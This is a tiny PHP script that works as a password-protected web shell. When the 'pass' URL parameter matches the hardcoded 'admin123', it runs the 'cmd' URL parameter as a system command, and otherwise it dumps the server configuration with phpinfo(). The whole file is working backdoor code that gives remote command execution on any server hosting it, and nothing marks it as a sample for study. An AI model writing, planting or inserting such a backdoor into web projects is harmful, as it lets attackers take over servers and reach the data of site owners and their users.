<?php
$p="admin123";
if($_GET["pass"]===$p){
    if(isset($_GET["cmd"])){system($_GET["cmd"]);}
    else{phpinfo();}
}
?>